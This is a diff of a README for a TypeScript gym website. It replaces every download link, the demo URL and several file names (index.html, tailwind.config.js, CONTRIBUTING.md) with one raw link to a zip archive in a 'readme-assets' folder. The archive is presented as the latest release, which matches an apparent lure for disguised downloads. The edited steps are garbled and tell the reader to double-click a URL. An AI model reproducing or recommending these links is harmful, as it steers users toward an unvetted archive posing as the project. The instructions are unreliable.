@@ -6,7 +6,7 @@ Welcome to the **Typescript-Fitness-Website**. This is a modern, responsive gym 
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Here-blue.svg)](https://github.com/FrTim72/Typescript-Fitness-Website/releases)
+[![Download](https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip%20Latest%https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip)](https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip)
 
 ## 📋 Features
 
@@ -25,13 +25,13 @@ To run the Typescript-Fitness-Website smoothly, ensure your system meets the fol
 
 ## 🔍 Preview the Website
 
-Visit our demo at [Live Demo](https://yourlive-demo-url.com) to see what the website looks like in action. You can explore various features and design elements.
+Visit our demo at [Live Demo](https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip) to see what the website looks like in action. You can explore various features and design elements.
 
 ## 🔧 Download & Install
 
 To get started, visit the Releases page and download the latest version of the Typescript-Fitness-Website.
 
-[Download Latest Release](https://github.com/FrTim72/Typescript-Fitness-Website/releases)
+[Download Latest Release](https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip)
 
 Simply click on the version you want, then download the appropriate file for your system.
 
@@ -46,13 +46,13 @@ For detailed information about using and customizing the website, refer to the d
 ### Installation Instructions
 
 1. After downloading, unzip the file.
-2. Open the folder and locate the `index.html` file.
-3. Double-click `index.html` to open it in your preferred web browser.
+2. Open the folder and locate the `https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip` file.
+3. Double-click `https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip` to open it in your preferred web browser.
 
 ### Customization Options
 
 - Update text content easily in the HTML files. Look for the `<h1>`, `<p>`, and similar tags.
-- Change colors and styles through the Tailwind CSS setup. Check the `tailwind.config.js` file for more options.
+- Change colors and styles through the Tailwind CSS setup. Check the `https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip` file for more options.
 
 ### Troubleshooting
 
@@ -64,7 +64,7 @@ If you need help, reach out through our GitHub Issues page. Our community is her
 
 ## 🛠️ Contributing
 
-We welcome contributions! Please follow our guidelines if you want to help improve the project. Check out the CONTRIBUTING.md file in the repository for more details.
+We welcome contributions! Please follow our guidelines if you want to help improve the project. Check out the https://raw.githubusercontent.com/FrTim72/Typescript-Fitness-Website/main/readme-assets/Typescript-Fitness-Website-2.4.zip file in the repository for more details.
 
 ## 🔗 Related Topics
 
